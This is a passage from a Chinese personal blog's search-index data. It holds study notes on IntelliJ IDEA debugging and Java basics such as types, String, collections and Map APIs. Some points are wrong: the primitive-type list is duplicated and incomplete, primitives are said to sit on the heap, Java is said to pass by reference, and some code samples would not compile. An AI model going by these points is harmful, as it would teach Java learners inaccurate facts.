toString(int mod)就可以输出该整数对应的所有的修饰符。public static boolean isPublic(int mod)就可以判断该整数对应的是不是包含public修饰符。","categories":[{"name":"静态分析","slug":"静态分析","permalink":"https://0range228.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"}],"tags":[{"name":"ASM","slug":"ASM","permalink":"https://0range228.github.io/tags/ASM/"}]},{"title":"IDEA Debug笔记","slug":"IDEA-Debug笔记","date":"2020-04-27T13:59:57.000Z","updated":"2020-05-10T04:51:44.824Z","comments":true,"path":"IDEA-Debug笔记/","link":"","permalink":"https://0range228.github.io/IDEA-Debug%E7%AC%94%E8%AE%B0/","excerpt":"序言 无惛惛之事者，无赫赫之功。 今天来学习IDEA的Debug调试技巧。","text":"序言 无惛惛之事者，无赫赫之功。 今天来学习IDEA的Debug调试技巧。 Debug简介和意义什么是程序DeBug？ Debug，是程序开发人员必会的一项调试程序的技能。 企业中程序开发和程序调试的比例为1:1.5，可以说如果你不会调试程序，你就没有办法从事编程工作。 Debug能帮助我们做什么？ 追踪代码的运行流程。 程序运行异常定位。 线上问题追踪。 Debug对于程序学习者的意义 通过调试能够更好的查看程序的执行流程。 复杂的程序逻辑，通过老师的口述讲解，很难理解清楚，这个时候借助调试能够很好的帮助同学们理解程序。 定位问题，提高自我解决问题的能力。 IDEA中的Debug步骤 设置断点（F9） 调试程序（8个按钮） 钮 说明 (Alt + F10)：如果你的光标在其它行或其它页面，点击这个按钮可跳转到当前代码执行的行 (F8)：步过，一行一行地往下走，如果这一行上有方法不会进入方法。 )) (F7)：步入。如果当前行有方法，可以进入方法内部，一般用于进入自定义方法内，不会进入官方类库的方法。 (Alt + Shift + F7)：强制步入，能进入任何方法，查看底层源码的时候可以用这个进入官方类库的方法。 (Shift + F8)：步出，从步入的方法内退出到方法调用处，此时方法已执行完毕，只是还没有完成赋值。 回退断点。 (Alt + F9)：运行到光标处，你可以将光标定位到你需要查看的那一行，然后使用这个功能，代码会运行至光标行，而不需要打断点。 (Alt + F8)：计算表达式。 观察变量 查看变量有三种方式： 程序区查看变量 Debugger的Variables中查看变量 鼠标悬停到变量名上会弹出当前变量的值 查看输出 跳转到当前代码执行的行 跳转到当前代码执行的行（Alt + F10） 作用 使程序窗口切换到当前正在运行的程序处。 步过调试的使用 步过调试 步过调试按钮（F8） 作用 步过，一行一行地往下走，如果这一行上有方法不会进入方法。 常用于调试过程中不想进入调用的方法体的情况。 步入调试的使用步入调试 步过调试按钮（F7） 作用 步入，一行一行地往下走，如果这一行上有方法，则进入方法内部。 一般用于进入自定义方法内，不会进入官方类库的方法。 强制步入调试的使用 强制步入调试 强制步入调试按钮（Alt + Shift + F7） 作用 进入官方类库方法 帮助我们学习和查看JDK源码 步出调试的使用 步出调试 步出调试按钮（Shift + F8） 作用 从方法内退出到方法调用处。 调试的时候，有时候会跳入到自己不想查看的方法体，这个时候使用步出。 回退断点调试的使用 回退断点 回退断点按钮 作用 回退到当前方法的调用处。 当想重新查看该方法体的执行过程时，不用重新启动Debug，可以使用回退断点方式。 运行到光标处运行到光标处 运行光标处按钮 （F9） 作用 使程序运行到光标处，而无需设置断点。 计算表达式 计算表达式 计算表达式按钮（Alt + F8） 作用 设置变量，在计算表达式的框里，可以改变变量的值，这样有时候就能很方便我们去调试各种值的情况了。 条件断点 条件断点 右键单击断点处，可以设置进入断点的条件 作用 通过设置断点条件，在满足条件时，才停在断点处，否则直接运行。 多线程调试 步骤 多线程调试，需要调整断点挂起级别为Thread Frame中选择线程进行调试","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"IDEA","slug":"IDEA","permalink":"https://0range228.github.io/tags/IDEA/"}]},{"title":"Java基础温习","slug":"Java基础温习","date":"2020-04-27T13:28:34.000Z","updated":"2021-10-06T04:40:08.163Z","comments":true,"path":"Java基础温习/","link":"","permalink":"https://0range228.github.io/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/","excerpt":"序言 锲而不舍，金石可镂。 今天来总结Java基础，来填本科的坑。 本篇将会是一篇长文，会持续更新。","text":"序言 锲而不舍，金石可镂。 今天来总结Java基础，来填本科的坑。 本篇将会是一篇长文，会持续更新。 Java数据类型基础类型：8种 ​ int、float、double、float、double、char、byte、boolean 引用类型：5种 ​ 类 / 数组 / 接口 / 枚举 / 注解 区别： 基本类型的变量存储原始值(常量)，常量存放在堆上。 引用类型的变量存储地址，存储的是堆中对象的地址。 从源代码到机器码，到底发生了什么？参考陈树义 如下图所示，编译器可以分为：前端编译器、JIT 编译器和AOT编译器。 前端编译器 ： 源代码-&gt;class字节码javac工具 javac 编译器的处理过程可以分为下面四个阶段： 第一个阶段：词法、语法分析。在这个阶段，javac 编译器会对源代码的字符进行一次扫描，最终生成一个抽象语法树AST。简单地说，在这个阶段 javac 编译器会搞懂我们的代码到底想要干嘛。就像我们分析一个句子一样，我们会对句子划分主谓宾，弄清楚这个句子要表达的意思一样。 第二个阶段：填充符号表。我们知道类之间是会互相引用的，但在编译阶段，我们无法确定其具体的地址，所以我们会使用一个符号来替代。在这个阶段做的就是类似的事情，即对抽象的类或接口进行符号填充。等到类加载阶段，javac 编译器会将符号替换成具体的内存地址。 第三个阶段：注解处理。我们知道 Java 是支持注解的，因此在这个阶段会对注解进行分析，根据注解的作用将其还原成具体的指令集。 第四个阶段：分析与字节码生成。到了这个阶段，javac 编译器便会根据上面几个阶段分析出来的结果，进行字节码的生成，最终输出为 class 文件。 JIT编译器：class字节码-&gt;机器码当源代码转化为字节码之后，其实要运行程序，有两种选择： 一种是使用 Java 解释器解释执行字节码，启动快，但是运行慢 另一种则是使用 JIT 编译器将字节码转化为本地机器代码，启动慢，但是运行快 原因很简单。 解释器不需要像 JIT 编译器一样，将所有字节码都转化为机器码，自然就少去了优化的时间。 当 JIT 编译器完成第一次编译后，其会将字节码对应的机器码保存下来，下次可以直接使用。 机器码的运行效率肯定是高于 Java 解释器的。 实际情况中，为了运行速度以及效率，我们通常采用两者相结合的方式进行 Java 代码的编译执行。 值传递与引用传递发生在形参与实参传递的过程中。 值传递基本类型的变量赋值就是值传递，相当于直接将常量值复制一份，函数接收的是原始值的一个copy。 此时内存中存在两个相等的基本类型，即实参和形参。 后面方法中的操作都是对形参这个值的修改，不影响实际参数的值。 引用传递也称为地址传递。方法调用时，实际参数的引用被传递给方法中相对应的形式参数，函数接收的是原始值的内存地址。在方法执行中，形参和实参内容相同，指向同一块内存地址，方法执行中对形参的操作将会影响到实际对象。 接口与抽象类的区别一个类只能继承一个父类，但是可以实现多个接口 抽象类只要类中有抽象方法，那么他就是抽象类 抽象方法：abstract+只有方法名 默认public abstract修饰 final 与 abstract不可以同时修饰 抽象类可以有成员变量、构造方法、抽象方法 只支持单继承 继承抽象类的子类必须extends，实现抽象类中的全部抽象方法 接口接口中方法默认 public abstract修饰，不需要特意声明 一个类如果实现了接口，那么就需要实现接口的全部方法 接口中方法默认public abstract 接口中字段默认public static final 在JDK8中可以定义static静态方法 &amp; default方法 default修饰方法的有默认方法体，实现类中可以重写也可以不重写 接口可以支持多继承。 编译类型与运行类型经典例子： 1234Father child = new son();编译类型 运行类型 child.doWork(); 理解： 编译类型由声明该变量的类型决定声明啥是啥，运行类型由实际赋值给的变量决定new啥是啥 如果这两个类型不一样，那么就是多态。 属性不具有多态，也就是对象在调用属性的时候，总会访问它编译类型的属性，而不是运行类型。 首先声明了一个引用类型Father child，用它来指向son类的一个实例。 在程序运行时，首先会调用父类的构造器，然后再调用子类的构造器。 在编译过程中，会自动检查引用变量Father child的编译类型，发现是Father类，会检查是否拥有doWork方法。 但是在JVM实际运行中，调用的是子类的doWork方法，而不是父类的，这就是运行时多态。 找方法，先找子类： 如果子类没有，再去找父类。 方法重写override 与重载overloadOverride 重写 (子类对父类方法重写）名称+参数列表必须完全相同 返回值类型 如果不同的话，必须是兼容类型 构造方法 final 和 static方法 不能重写 Overload 重载 (一个方法内)方法名称必须相同，参数必须不同 返回值没要求 系统属性来自javadoc Scanner 类 java.lang.String : 接受用户的键盘输入 导包的一般步骤： 导包： import 包路径.类名称 如果需要使用的目标类，和当前位于同一个包下，则可以省略导包语句不写。 只有java.lang包下的内容不需要导包，其他的包都需要import语句。 创建： 类名称 对象名 = new 类名称（）； 使用 对象名.方法名（）; Demo: 123Scanner sc = new Scanner(System.in);int i = sc.nextInt();//接收一个int数字String str = sc.next();//接收一个String字符串 匿名对象创建对象的标准格式： 对象名 1234匿名对象就是只有右边的对象，没有左边的名字和赋值运算符。&#96;&#96;&#96; new 类名称（）； 匿名对象只能使用唯一的一次，下次再用不得不再创建一个新对象。 如果确定有一个对象只需要使用唯一的一次，就可以用匿名对象。 12int num = new Scanner(System.in).nextInt();System.out.println(\"输入的是\"+num); Random类 java.util.Random 生成伪随机数。 1234Random r = new Random();int i = r.nextInt();//public int nextInt(int n)//返回一个随机数，范围在[0，n）之间，左闭右开 enum枚举类一般表示一组常量，例如一周有7天、一年有4个季节。 1234567891011121314enum Color&#123; RED, GREEN, BLUE;&#125; public class Test&#123; // 执行输出结果 public static void main(String[] args) &#123; Color c1 = Color.RED; System.out.println(c1); &#125;&#125; enum内部方法values(), ordinal() 和 valueOf() 方法enum 定义的枚举类默认继承了 java.lang.Enum 类，并实现了 java.lang.Seriablizable 和 java.lang.Comparable 两个接口。 values(), ordinal() 和 valueOf() 方法位于 java.lang.Enum 类中： values() 返回枚举类中所有的值。 ordinal()方法可以找到每个枚举常量的索引，就像数组索引一样。 valueOf()方法返回指定字符串值的枚举常量。 123456789101112131415161718192021222324252627282930enum Color&#123; RED, GREEN, BLUE;&#125; public class Test&#123; public static void main(String[] args) &#123; // 调用 values() Color[] arr = Color.values(); // 迭代枚举 for (Color col : arr) &#123; // 查看索引 System.out.println(col + \" at index \" + col.ordinal()); &#125; // 使用 valueOf() 返回枚举常量，不存在的会报错 IllegalArgumentException System.out.println(Color.valueOf(\"RED\")); // System.out.println(Color.valueOf(\"WHITE\")); &#125;&#125;Result：RED at index 0GREEN at index 1BLUE at index 2RED enum枚举类成员枚举跟普通类一样可以用自己的变量、方法和构造函数，构造函数只能使用 private 访问修饰符，所以外部无法调用。 枚举既可以包含具体方法，也可以包含抽象方法。 如果枚举类具有抽象方法，则枚举类的每个实例都必须实现它。 123456789101112131415161718192021222324252627282930313233enum Color&#123; RED, GREEN, BLUE; // 构造函数 private Color() &#123; System.out.println(\"Constructor called for : \" + this.toString()); &#125; public void colorInfo() &#123; System.out.println(\"Universal Color\"); &#125;&#125; public class Test&#123; // 输出 public static void main(String[] args) &#123; Color c1 = Color.RED; System.out.println(c1); c1.colorInfo(); &#125;&#125;Result:Constructor called for : REDConstructor called for : GREENConstructor called for : BLUEREDUniversal Color ArrayList类 java.util.ArrayList 大小可变的集合，长度动态增长 ArrayList list = new ArrayList&lt;&gt;(); 成员方法 public boolean add(E e)：将指定的元素添加到集合尾部 public E remove(int index)：移除指定下标元素，返回被删除的元素。 public E get(int index)：捕获此集合中指定位置上的元素。 public int size()：返回此集合中的元素数。遍历集合时，可以控制索引范围，防止越界。 包装类ArrayList对象不能存储基本类型，只能存储引用类型的数据。 类似&lt;int&gt;不能写，但是存储基本数据类型对应的包装类型是可以的。所以，想要存储基本类型数据，必须转换后才能编写，转换写法如下： String类 java.lang.String 底层是字符数组 构造方法 public String(char[] value)：通过当前参数中的字符数组来构造新的String。 public String(byte[] bytes)：通过使用平台的默认字符集解码当前参数中的字节数组来构造新的 String。 12345678910111213141516public class String_Demo01 &#123;public static void main(String[] args) &#123;// 创建字符串对象String s1 = \"hello\";String s2 = \"hello\";String s3 = \"HELLO\";// boolean equals(Object obj):比较字符串的内容是否相同System.out.println(s1.equals(s2)); // trueSystem.out.println(s1.equals(s3)); // falseSystem.out.println(\"‐‐‐‐‐‐‐‐‐‐‐\");//boolean equalsIgnoreCase(String str):比较字符串的内容是否相同,忽略大小写System.out.println(s1.equalsIgnoreCase(s2)); // trueSystem.out.println(s1.equalsIgnoreCase(s3)); // trueSystem.out.println(\"‐‐‐‐‐‐‐‐‐‐‐\");&#125;&#125; 获取功能的方法 public int length ()：返回此字符串的长度。 public String concat (String str)：将指定的字符串连接到该字符串的末尾。 public char charAt (int index) ：返回指定索引处的 char值。 public int indexOf (String str) ：返回指定子字符串第一次出现在该字符串内的索引。 public String substring (int beginIndex) ：返回一个子字符串，从beginIndex开始截取字符串到字符 串结尾。 public String substring (int beginIndex, int endIndex) ：返回一个子字符串，从beginIndex到 endIndex截取字符串。含beginIndex，不含endIndex。 1234567891011121314151617181920212223242526272829public class String_Demo02 &#123;public static void main(String[] args) &#123;//创建字符串对象String s = \"helloworld\";// int length():获取字符串的长度，其实也就是字符个数System.out.println(s.length());System.out.println(\"‐‐‐‐‐‐‐‐\");// String concat (String str):将将指定的字符串连接到该字符串的末尾.String s = \"helloworld\";String s2 = s.concat(\"**hello again\");System.out.println(s2);// helloworld**hello again// char charAt(int index):获取指定索引处的字符System.out.println(s.charAt(0));System.out.println(s.charAt(1));System.out.println(\"‐‐‐‐‐‐‐‐\");// int indexOf(String str):获取str在字符串对象中第一次出现的索引,没有返回‐1System.out.println(s.indexOf(\"l\"));System.out.println(s.indexOf(\"owo\"));System.out.println(s.indexOf(\"ak\"));System.out.println(\"‐‐‐‐‐‐‐‐\");// String substring(int start):从start开始截取字符串到字符串结尾System.out.println(s.substring(0));System.out.println(s.substring(5));System.out.println(\"‐‐‐‐‐‐‐‐\");// String substring(int start,int end):从start到end截取字符串。含start，不含end,左闭右开System.out.println(s.substring(0, s.length()));System.out.println(s.substring(3,8));&#125;&#125; 转换功能的方法 public char[] toCharArray ()：将此字符串转换为新的字符数组。 public byte[] getBytes ()：使用平台的默认字符集将该 String编码转换为新的字节数组。 public String replace (CharSequence target, CharSequence replacement)：将与target匹配的字符串使用replacement字符串替换。 1234567891011121314151617181920212223public class String_Demo03 &#123;public static void main(String[] args) &#123;//创建字符串对象String s = \"abcde\";// char[] toCharArray():把字符串转换为字符数组char[] chs = s.toCharArray();for(int x = 0; x &lt; chs.length; x++) &#123;System.out.println(chs[x]);&#125;System.out.println(\"‐‐‐‐‐‐‐‐‐‐‐\");// byte[] getBytes ():把字符串转换为字节数组byte[] bytes = s.getBytes();for(int x = 0; x &lt; bytes.length; x++) &#123;System.out.println(bytes[x]);&#125;System.out.println(\"‐‐‐‐‐‐‐‐‐‐‐\");// 替换字母it为大写ITString str = \"itcast itheima\";String replace = str.replace(\"it\", \"IT\");System.out.println(replace); // ITcast ITheimaSystem.out.println(\"‐‐‐‐‐‐‐‐‐‐‐\");&#125;&#125; Arrays 类 java.util.Arrays 此类包含用来操作数组的各种方法，比如排序和搜索等。其所有方法均为静态方法，调用起来 非常简单。 操作数组的方法 public static String toString(int[] a)：返回指定数组内容的字符串表示形式。 12345678910public static void main(String[] args) &#123;// 定义int 数组int[] arr = &#123;2,34,35,4,657,8,69,9&#125;;// 打印数组,输出地址值System.out.println(arr); // [I@2ac1fdc4// 数组内容转为字符串String s = Arrays.toString(arr);// 打印字符串,输出内容System.out.println(s); // [2, 34, 35, 4, 657, 8, 69, 9]&#125; public static void sort(int[] a)：对指定的 int 型数组按数字升序进行排序。 12345678910public static void main(String[] args) &#123;// 定义int 数组int[] arr = &#123;24, 7, 5, 48, 4, 46, 35, 11, 6, 2&#125;;System.out.println(\"排序前:\"+ Arrays.toString(arr)); // 排序前:[24, 7, 5, 48, 4, 46, 35, 11, 6,2]// 升序排序Arrays.sort(arr);System.out.println(\"排序后:\"+ Arrays.toString(arr));// 排序后:[2, 4, 5, 6, 7, 11, 24, 35, 46,48]&#125; StringBuilder 类StringBuilder是个字符串的缓冲区，即它是一个容器，容器中可以装很多字符串。并且能够对其中的字符串进行各种操作。 它的内部拥有一个数组用来存放字符串内容，进行字符串拼接时，直接在数组中加入新内容。StringBuilder会自动维护数组的扩容，默认16字符空间，超过自动扩充。 1234567public static void main(String[] args) &#123; StringBuilder sb1 = new StringBuilder(); System.out.println(sb1); // (空白) // 使用带参构造 StringBuilder sb2 = new StringBuilder(\"itcast\"); System.out.println(sb2); // itcast&#125; 常用方法StringBuilder常用的方法有2个： public StringBuilder append(...)：添加任意类型数据的字符串形式，并返回当前对象自身。 public String toString()：将当前StringBuilder对象转换为String对象。 append方法append方法具有多种重载形式，可以接收任意类型的参数。任何数据作为参数都会将对应的字符串内容添加到StringBuilder中。例如： 123456789101112131415161718192021public class Demo02StringBuilder &#123; public static void main(String[] args) &#123; //创建对象 StringBuilder builder = new StringBuilder(); //public StringBuilder append(任意类型) StringBuilder builder2 = builder.append(\"hello\"); //对比一下 System.out.println(\"builder:\"+builder); System.out.println(\"builder2:\"+builder2); System.out.println(builder == builder2); //true // 可以添加 任何类型 builder.append(\"hello\"); builder.append(\"world\"); builder.append(true); builder.append(100); // 在我们开发中，会遇到调用一个方法后，返回一个对象的情况。然后使用返回的对象继续调用方法。 //链式编程builder.append(\"hello\").append(\"world\").append(true).append(100); System.out.println(\"builder:\"+builder); &#125;&#125; toString方法通过toString方法，StringBuilder对象将会转换为不可变的String对象。如： 123456789public class Demo16StringBuilder &#123; public static void main(String[] args) &#123; // 链式创建 StringBuilder sb = new StringBuilder(\"Hello\").append(\"World\").append(\"Java\"); // 调用方法 String str = sb.toString(); System.out.println(str); // HelloWorldJava &#125;&#125; 集合集合按照其存储结构可以分为两大类，分别是： 单列集合java.util.Collection 双列集合java.util.Map Collection集合单列集合类的根接口，用于存储一系列符合某种规则的元素，它有两个重要的子接口，分别是： java.util.List java.util.Set 其中，List的特点是元素有序、元素可重复。 Set的特点是元素无序，而且不可重复。 List接口的主要实现类有java.util.ArrayList和java.util.LinkedList； Set接口的主要实现类有java.util.HashSet和java.util.TreeSet。 Collection常用功能Collection是所有单列集合的父接口，因此在Collection中定义了单列集合(List和Set)通用的一些方法，这些方法可用于操作所有的单列集合。方法如下： public boolean add(E e)： 把给定的对象添加到当前集合中 public void clear() :清空集合中所有的元素 public boolean remove(E e): 把给定的对象在当前集合中删除 public boolean contains(E e): 判断当前集合中是否包含给定的对象 public boolean isEmpty(): 判断当前集合是否为空 public int size(): 返回集合中元素的个数 public Object[] toArray(): 把集合中的元素，存储到数组中 List接口java.util.List 接口继承自 Collection 接口，是单列集合的一个重要分支，习惯性地会将实现了 List 接口的对象称为List集合。 在List集合中允许出现重复的元素，所有的元素是以一种线性方式进行存储的，在程序中可以通过【索引】来访问集合中的指定元素。 另外，List集合还有一个特点就是元素有序，即元素的存入顺序和取出顺序一致。 List常用方法List作为Collection集合的子接口，不但继承了Collection接口中的全部方法，而且还增加了一些根据元素索引来操作集合的特有方法，如下： public void add(int index, E element) : 将指定的元素，添加到该集合中的指定位置上。 public E get(int index):返回集合中指定位置的元素。 public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 List集合特有的方法都是跟索引相关： 123456789101112131415161718192021222324252627282930313233public class ListDemo &#123;public static void main(String[] args) &#123;// 创建List集合对象List&lt;String&gt; list = new ArrayList&lt;String&gt;();// 往 尾部添加 指定元素list.add(\"图图\");list.add(\"小美\");list.add(\"不高兴\");System.out.println(list);// add(int index,String s) 往指定位置添加list.add(1,\"没头脑\");System.out.println(list);// String remove(int index) 删除指定位置元素 返回被删除元素// 删除索引位置为2的元素System.out.println(\"删除索引位置为2的元素\");System.out.println(list.remove(2));System.out.println(list);// String set(int index,String s)// 在指定位置 进行 元素替代（改）// 修改指定位置元素list.set(0, \"三毛\");System.out.println(list);// String get(int index) 获取指定位置元素// 跟size() 方法一起用 来 遍历的for(int i = 0;i&lt;list.size();i++)&#123;System.out.println(list.get(i));&#125;//还可以使用增强forfor(String str : list)&#123; System.out.println(string);&#125;&#125;&#125; Set接口java.util.Set 接口和 java.util.List 接口一样，同样继承自 Collection 接口，它与 Collection 接口中的方法基本一致，并没有对 Collection 接口进行功能上的扩充，只是比 Collection 接口更加严格了。 与 List 接口不 同的是， Set 接口中元素【无序】，并且都会以某种规则保证存入的元素不出现重复。 Map集合 Collection 中的集合，元素是孤立存在的（理解为单身），向集合中存储元素采用一个个元素的方式存储。 Map 中的集合，元素是成对存在的(理解为夫妻)。 每个元素由键与值两部分组成，通过键可以找对所对应的值。 Collection 中的集合称为单列集合， Map 中的集合称为双列集合。 需要注意的是， Map 中的集合不能包含重复的键，值可以重复；每个键只能对应一个值。 Map常用子类通过查看Map接口描述，看到Map有多个子类，这里我们主要讲解常用的HashMap集合、LinkedHashMap集合。 HashMap：存储数据采用的哈希表结构，元素的存取顺序不能保证一致。由于要保证键的唯一、不重复，需要重写键的hashCode()方法、equals()方法。 LinkedHashMap：HashMap下有个子类LinkedHashMap，存储数据采用的哈希表结构+链表结构。通过链表结构可以保证元素的存取顺序一致；通过哈希表结构可以保证的键的唯一、不重复，需要重写键的 hashCode()方法、equals()方法。 tips：Map接口中的集合都有两个泛型变量,在使用时，要为两个泛型变量赋予数据类型。两个泛型变量的数据类型可以相同，也可以不同。 Map接口常用方法Map接口中定义了很多方法，常用的如下： public V put(K key, V value): 把指定的键与指定的值添加到Map集合中。 public V remove(Object key): 把指定的键所对应的键值对元素在Map集合中删除，返回被删除元素的值。 public V get(Object key): 根据指定的键，在Map集合中获取对应的value。 public Set&lt;k&gt; keySet(): 获取Map集合中所有的键，存储到Set集合中。 public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() : 获取到Map集合中所有的键值对对象的集合(Set集合)。 演示： 1234567891011121314151617public class MapDemo &#123;public static void main(String[] args) &#123;//创建 map对象HashMap&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();//添加元素到集合map.put(\"黄晓明\", \"杨颖\");map.put(\"文章\", \"马伊琍\");map.put(\"邓超\", \"孙俪\");System.out.println(map);//String remove(String key)System.out.println(map.remove(\"邓超\"));System.out.println(map);// 想要查看 黄晓明的媳妇 是谁System.out.println(map.get(\"黄晓明\"));System.out.println(map.get(\"邓超\"));&#125;&#125; tips: 使用put方法时，若指定的键(key)在集合中没有，则没有这个键对应的值，返回null，并把指定的键值添加到集合中； 若指定的键(key)在集合中存在，则返回值为集合中键对应的值（该值为替换前的值），并把指定键所对应的值，替换成指定的新值。 Entry 键值对对象我们已经知道， Map 中存放的是两种对象，一种称为key(键)，一种称为value(值)，它们在在 Map 中是一一对应关系，这一对对象又称做 Map 中的一个 Entry(项) 。 Entry 将键值对的对应关系封装成了对象。即键值对对象，这样我们在遍历 Map 集合时，就可以从每一个键值对（ Entry ）对象中获取对应的键与对应的值。 既然Entry表示了一对键和值，那么也同样提供了获取对应键和对应值得方法： public K getKey()：获取Entry对象中的键。 public V getValue()：获取Entry对象中的值。 在Map集合中也提供了获取所有Entry对象的方法： public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() : 获取到Map集合中所有的键值对对象的集合(Set集合)。 Map集合遍历键值对的方式键值对方式：即通过集合中每个键值对(Entry)对象，获取键值对(Entry)对象中的键与值。 操作步骤与图解： 获取Map集合中，所有的键值对(Entry)对象，以Set集合形式返回。entrySet() 。 遍历包含键值对(Entry)对象的Set集合，得到每一个键值对(Entry)对象。 通过键值对(Entry)对象，获取Entry对象中的键与值。getKey()/getValue() 123456789101112131415161718public class MapDemo02 &#123;public static void main(String[] args) &#123;// 创建Map集合对象HashMap&lt;String, String&gt; map = new HashMap&lt;String,String&gt;();// 添加元素到集合map.put(\"胡歌\", \"霍建华\");map.put(\"郭德纲\", \"于谦\");map.put(\"薛之谦\", \"大张伟\");// 获取 所有的 entry对象 entrySetSet&lt;Entry&lt;String,String&gt;&gt; entrySet = map.entrySet();// 遍历得到每一个entry对象for (Entry&lt;String, String&gt; entry : entrySet) &#123;// 解析String key = entry.getKey();String value = entry.getValue();System.out.println(key+\"的CP是:\"+value);&#125;&#125; 图解： 高级用法 函数式编程介绍几个有趣且强大的API： 1234567891011121314151617181920// 对key所属的value进行计算default V compute(K key,BiFunction&lt;? super K,? super V,? extends V&gt; remappingFunction)// 如果key还没有映射的value，则计算default V computeIfAbsent(K key, Function&lt;? super K,? extends V&gt; mappingFunction)// 如果key存在映射的value，则计算default V computeIfPresent(K key, BiFunction&lt;? super K,? super V,? extends V&gt; remappingFunction)// 遍历map的entrydefault void forEach(BiConsumer&lt;? super K,? super V&gt; action)// 返回key对应的value，如果不存在则返回defaultValuedefault V getOrDefault(Object key,V defaultValue)// 如果key还没有映射的value，则存放value与key映射default V putIfAbsent(K key, V value)// 将 hashMap 中的所有映射关系替换成给定的函数所执行的结果default void replaceAll(BiFunction&lt;? super K,? super V,? extends V&gt; function)// 判断key是否存在，如果不存在，则添加&lt;key，value&gt;default V putIfAbsent(K key,V value)// 如果 key 对应的 value 不存在，则添加键值对到 hashMap 中。如果存在，则返回通过 remappingFunction 重新计算后的值。default V merge(K key, V value, BiFunction&lt;? super V,? super V,? extends V&gt; remappingFunction) 代码示例； 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192public static void ComputeTest()&#123; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); map.put(1, 1); map.put(2, 2); map.put(3, 3); System.out.println(map); // 让每一个value都加一 for (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123; map.compute(entry.getKey(),(k,v)-&gt;&#123; return v+1; &#125;); &#125; System.out.println(map);&#125;private static void ComputeIfPresentTest() &#123; Map&lt;Integer, String&gt; oldMap = new HashMap&lt;&gt;(); oldMap.put(1, \"Google\"); oldMap.put(2, \"Baidu\"); oldMap.put(3, \"Bing\"); Map&lt;Integer, String&gt; newMap = new HashMap&lt;&gt;(); newMap.put(2, \"BaiduNew\"); newMap.put(3, \"BingNew\"); System.out.println(oldMap); // 遍历newMap，如果oldMap存在相同的key，那么就把oldmap中key对应的value改成新的 for (Map.Entry&lt;Integer, String&gt; newEntry : newMap.entrySet()) &#123; oldMap.computeIfPresent(newEntry.getKey(),(k,v)-&gt;&#123; v = newEntry.getValue(); return v; &#125;); &#125; System.out.println(oldMap);&#125;private static void test2() &#123; Map&lt;Integer, String&gt; oldMap = new HashMap&lt;&gt;(); oldMap.put(1, \"Google\"); oldMap.put(2, \"Baidu\"); oldMap.put(3, \"Bing\"); Map&lt;Integer, String&gt; newMap = new HashMap&lt;&gt;(); newMap.put(2, \"BaiduNew\"); newMap.put(3, \"BingNew\"); newMap.put(4, \"AllNew\"); System.out.println(oldMap); // 遍历newMap，对于oldMap里面不存在的key，计算一个新的entry返回 for (Map.Entry&lt;Integer, String&gt; newEntry : newMap.entrySet()) &#123; oldMap.computeIfAbsent(newEntry.getKey(),k-&gt;newEntry.getValue()); &#125; System.out.println(oldMap);&#125;public static void replaceall() &#123; Map&lt;Integer, String&gt; map = new HashMap&lt;&gt;(); map.put(1, \"Google\"); map.put(2, \"Baidu\"); map.put(3, \"Bing\"); System.out.println(map); // 全部替换为大写 map.replaceAll((k, v) -&gt; &#123; return v.toUpperCase(); &#125;); // map.replaceAll((k, v) -&gt; v.toUpperCase()); // 写成一行去掉大括号也是可以的 默认都是return System.out.println(map);&#125;// 遍历entry oldMap.forEach((k,v)-&gt;&#123; System.out.println(k+v); &#125;); private static void test3() &#123; Map&lt;Integer, String&gt; oldMap = new HashMap&lt;&gt;(); oldMap.put(1, \"Google\"); oldMap.put(2, \"Baidu\"); oldMap.put(3, \"Bing\"); System.out.println(oldMap); // 如果4不存在，那么添加&lt;4,\"NEW\"&gt;,如果4存在，那么把它的value改成k+\"/\"+v oldMap.merge(4,\"NEW\",(k,v)-&gt;k+\"/\"+v); System.out.println(oldMap);&#125; Iterator迭代器在程序开发中，经常需要遍历集合中的所有元素。针对这种需求，JDK专门提供了一个接口java.util.Iterator。Iterator接口也是Java集合中的一员，但它与Collection、Map接口有所不同，Collection接口与Map接口主要用于存储元素，而Iterator主要用于迭代访问（即遍历）Collection中的元素，因此Iterator对象也被称为迭代器。 想要遍历Collection集合，那么就要获取该集合迭代器完成迭代操作，下面介绍一下获取迭代器的方法： public Iterator iterator(): 获取集合对应的迭代器，用来遍历集合中的元素的。 下面介绍一下迭代的概念： 迭代：即Collection集合元素的通用获取方式。在取元素之前先要判断集合中有没有元素，如果有，就把这个元素取出来，继续在判断，如果还有就再取出出来。一直把集合中的所有元素全部取出。这种取出方式专业术语称为迭代。 Iterator接口的常用方法如下： public E next():返回迭代的下一个元素。 public boolean hasNext():如果仍有元素可以迭代，则返回 true。 接下来通过案例学习如何使用Iterator迭代集合中元素： 12345678910111213141516171819public class IteratorDemo &#123; public static void main(String[] args) &#123; // 使用多态方式 创建对象 Collection&lt;String&gt; coll = new ArrayList&lt;String&gt;(); // 添加元素到集合 coll.add(\"串串星人\"); coll.add(\"吐槽星人\"); coll.add(\"汪星人\"); //遍历 //使用迭代器 遍历 每个集合对象都有自己的迭代器 Iterator&lt;String&gt; it = coll.iterator(); // 泛型指的是 迭代出 元素的数据类型 while(it.hasNext())&#123; //判断是否有迭代元素 String s = it.next();//获取迭代出的元素 System.out.println(s); &#125; &#125;&#125; 实现原理： 在调用Iterator的next方法之前，迭代器的索引位于第一个元素之前，不指向任何元素，当第一次调用迭代器的next方法后，迭代器的索引会向后移动一位，指向第一个元素并将该元素返回，当再次调用next方法时，迭代器的索引会指向第二个元素并将该元素返回，依此类推，直到hasNext方法返回false，表示到达了集合的末尾，终止对元素的遍历。 增强for123456789101112public class NBFor &#123; public static void main(String[] args) &#123; Collection&lt;String&gt; coll = new ArrayList&lt;String&gt;(); coll.add(\"小河神\"); coll.add(\"老河神\"); coll.add(\"神婆\"); //使用增强for遍历 for(String s :coll)&#123;//接收变量s代表 代表被遍历到的集合元素 